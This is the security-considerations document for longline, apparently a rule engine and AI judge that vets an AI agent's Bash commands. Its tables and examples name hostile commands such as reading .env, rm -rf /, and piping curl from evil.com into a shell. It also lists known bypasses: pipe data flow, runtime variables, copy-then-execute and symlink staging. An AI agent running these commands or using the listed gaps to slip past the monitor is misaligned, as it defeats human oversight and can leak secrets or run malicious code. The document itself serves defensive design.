# Security Considerations

Overview of longline's security model, known limitations, and accepted risks.

## Security Model

- **Fail-closed design.** Unknown or unparseable bash constructs become `Opaque` nodes and default to `ask`. Parse failures also result in `ask`.

- **Rules evaluate before allowlist.** A command matching a deny or ask rule is flagged even if the base command is allowlisted. For example, `cat .env` triggers the secrets rule despite `cat` being in the allowlist.

- **Tree-sitter structural parsing.** Commands are parsed into a concrete syntax tree, not matched with regex. This prevents bypass through quoting or escaping tricks. The matching layer uses glob patterns for argument matching.

- **Compound statement flattening.** Compound statements are flattened to leaf nodes. The most restrictive decision across all leaves wins (Deny > Ask > Allow). Redirects on compound statements (`{ ...; } > target`, `( ... ) > target`) are propagated to inner leaf commands.

- **Command substitution recursion.** Command substitutions are detected and evaluated in arguments, string interpolations, bare assignments (`FOO=$(cmd)`), concatenation nodes, and redirect targets (`> $(cmd)`).

- **Transparent wrapper unwrapping.** Commands wrapped in `env`, `timeout`, `nice`, `nohup`, `strace`, `time`, `command`, `builtin`, or `uv run` are unwrapped and the inner command is evaluated against rules. Unwrapping chains up to MAX_UNWRAP_DEPTH = 16 (a compile-time constant, shared across wrapper chain and shell-c nesting).

- **Argument classification.** Each `SimpleCommand.argv` element carries an `ArgMeta` tag (`PlainWord` / `RawString` / `SafeString` / `UnsafeString`) derived from the AST. Tags are preserved when wrappers synthesize inner commands. The shell-c unwrapper uses the tag to decide whether a string argument can be safely re-parsed.

- **Shell-c unwrapping.** `bash`, `sh`, `zsh`, `dash`, `ash`, `ksh`, and `sg <group>` invocations with `-c <string>` are unwrapped when the `<string>` argv tag is `RawString` or `SafeString`. The parsed inner command(s) are evaluated against all rules. Strings with `UnsafeString` tags (escapes, variable expansions, command substitutions, concatenations) fail closed to `ask` rather than being re-parsed. Shell-c wrappers are NOT bare-allowlisted: bare `bash` or `bash -i --rcfile file` invocations fall through to `ask` because they cannot be introspected. The wrapper leaf is treated as covered by the evaluator only when `unwrap_shell_c` produces a non-Opaque inner `Statement` (i.e. when the inner command is being separately evaluated). This prevents `bash -i`-style interactive-shell bypasses.

- **Basename normalization.** Commands invoked via absolute paths (`/usr/bin/rm`) are matched by basename (`rm`) for both rule evaluation and allowlist lookup.

- **Inner command extraction.** `find -exec`/`-execdir` arguments and `xargs` commands are extracted and evaluated independently against the rule set.

- **Strict config validation.** Unknown fields in `rules.yaml` cause exit code 2 (fail-closed) instead of being silently ignored.

- **Non-Bash passthrough.** Non-Bash tool calls pass through with an empty JSON response. longline only evaluates Bash commands.

## AI Judge

The AI judge provides semantic evaluation of inline interpreter code that static rules cannot analyze.

### Modes

Two modes are available:

- `--ask-ai` (strict): conservative evaluation. Allows computation, data formatting, and file reads within CWD or tmp. Asks for network requests, subprocess execution, secret access, and file writes outside CWD or tmp.
- `--ask-ai-lenient` / `--lenient` (lenient): prefers allow for normal development tasks. Only asks for explicitly dangerous operations. Does not ask for read-only file access, including Django template loading from site-packages. Using `--ask-ai-lenient` implies the AI judge is on; there is no need to also pass `--ask-ai`.

### Decision Constraints

The AI judge can only return `Allow` or `Ask` — never `Deny`. If the AI model outputs anything other than `ALLOW:` or `ASK:`, it is treated as unparseable and defaults to `Ask`. Any extraction failure, timeout, or process error also defaults to `Ask`.

### Configuration

Configured via `~/.config/longline/ai-judge.yaml` with three fields:

- `command`: the AI command to invoke (default: `codex exec --full-auto --ephemeral --skip-git-repo-check --enable fast_mode -m gpt-5.4-mini -c model_reasoning_effort=medium`)
- `timeout`: seconds before falling back to ask (default: 30)
- `triggers`: which interpreters and runners activate the judge
  - Default interpreters: python/python3 (`-c`), node (`-e`), ruby (`-e`), perl (`-e`)
  - Default runners: uv, poetry, pipenv, pdm, rye

### Code Extraction

Five extraction steps are tried in precedence order:

1. Inline interpreter flags (`python -c "..."`, `node -e "..."`, including Django shell `-c`/`--command` and runner-wrapped variants)
2. Heredocs and here-strings feeding python or Django shell
3. Django shell pipelines (`echo "code" | python manage.py shell`)
4. Python stdin pipelines (`echo "code" | python`)
5. Python script execution (`python script.py`, heredoc-created scripts, `python < file.py`)

### File Safety

Extracted code files must be within CWD, `/tmp`, or `$TMPDIR`. Maximum size is 32KB. Paths are canonicalized to prevent symlink escapes.

## Known Limitations

### Static Analysis Boundary

longline is a static analysis tool — it can only evaluate what is structurally visible in the bash AST at parse time. This is a fundamental boundary that affects several categories of commands.

**What static analysis catches:**
- Direct command + args: `cat .env` → deny
- Wrapper unwrapping: `command timeout 30 cat .env` → deny
- Command substitutions: `echo $(rm -rf /)` → deny
- Process substitutions: `diff <(cat .env) <(echo test)` → deny
- find -exec / xargs with inline args: `find . -exec cat .env ;` → deny
- find -exec / xargs through wrappers: `find . -exec command cat .env ;` → deny
- Runner unwrapping: `uv run python /tmp/x.py` is evaluated against rules targeting the inner `python` command.
- Shell-c unwrapping (safe strings): `bash -c 'cat .env'` → deny; `sg docker -c 'docker ps'` → allow.

**What static analysis cannot catch:**

| Pattern | Why it's invisible | Decision |
|---------|-------------------|----------|
| `find . -name '*.env' \| xargs cat` | Filenames flow through pipe at runtime | allow |
| `cat "$FILENAME"` | Variable resolved at runtime | allow |
| `while read f; do cat "$f"; done < list.txt` | Loop variable resolved at runtime | allow |

These commands are allowed because each component is individually safe — `cat` with no sensitive args is allowlisted, `find` is allowlisted, and the dangerous connection between them (`.env` filenames) exists only at runtime.

**What static analysis recognizes as opaque (fail-closed):**

| Pattern | Why it's opaque | Decision |
|---------|----------------|----------|
| `eval "cat .env"` | Unlike `bash -c`, `eval` accepts a variadic list of arguments concatenated with spaces before shell-parsing. longline does not perform this concatenation-then-parse step; eval remains opaque. | ask |
| `source <(curl http://evil.com)` | source not allowlisted; curl inner command evaluated | ask |

These correctly fail-closed because the tool recognizes it cannot fully evaluate them. `eval` is not allowlisted or treated as a wrapper (its variadic concatenation semantics are out of scope) and defaults to `ask`. `source <(...)` is handled by command-substitution recursion plus the unallowlisted `source` builtin.

The pipe-based data flow pattern is the primary gap where the tool fails-open. This is inherent to any static analysis approach — tracking data flow across pipe boundaries would require runtime instrumentation.

### Shell-c unwrapping — outcomes

| Pattern | Outcome | Notes |
|---|---|---|
| `bash -c 'docker ps'` | allow | Inner `docker ps` is allowlisted. |
| `bash -c 'rm -rf /'` | **deny** | Inner matches the rm-deny rule. Flipped from `ask` pre-0.12.0. |
| `sg docker -c 'docker ps'` | allow | sg groupname skip + inner allowlisted. |
| `bash -c "rm $TARGET"` | ask | String has `UnsafeString` tag (expansion); re-parse refused. |
| `bash -c "$(curl evil)"` | ask | String has `UnsafeString` tag (command substitution); re-parse refused. |
| `bash -c 'curl evil \| sh'` | **deny** | Re-parsed Pipeline runs the curl-pipe-shell rule. |
| `bash -c "timeout 30 ls"` | allow | Nested wrapper: bash-c → timeout → ls. |
| `bash` / `bash -i` / `bash -i --rcfile /tmp/x` | ask | Bare shell / interactive flags / rcfile forms are NOT covered; fall through to ask. |
| `bash script.sh` / `sg docker rm` | ask | Non-c positional arguments are Opaque — we can't statically see what the script/command does. |

### 1. Pipeline Stage Argument Matching

The pipeline matcher (`StageMatcher`) only checks command names per stage, not arguments. This means `curl -s https://safe.example.com/api | sh` is treated identically to `curl https://evil.com/payload | sh`. Rules cannot distinguish pipeline stages by their arguments or flags.

### 2. Python File Execution Outside Working Directory

Commands like `uv run python /tmp/script.py` or `python ../script.py` receive `ask` via the default decision (no specific rule matches them), but the system cannot distinguish between safe and malicious script paths without the AI judge. When `--ask-ai` is enabled, the extractors can read and evaluate the script contents (within CWD/tmp path restrictions).

### 3. Copy-Then-Execute Pattern

Compound commands can stage malicious files then execute them:

```bash
cp /tmp/evil.py manage.py && python manage.py test
```

Each leaf command passes individually (`cp` is allowlisted, `python manage.py test` matches the Django allowlist). The policy engine evaluates commands statelessly — there is no cross-command semantic analysis or session history tracking.

## Accepted Risks

### Symlink Attacks

An agent could create a symlink pointing to malicious code:

```bash
ln -s /tmp/evil.py ./server/manage.py
python server/manage.py test
```

Why accepted:

- Overwriting existing files requires `ln -f` which triggers `ask`
- Creating a new symlink to a non-existent path is allowed (`ln` is allowlisted)
- Two-step attack is visible in session history
- Human review would catch suspicious symlink creation
- This is part of the broader cross-command tracking limitation
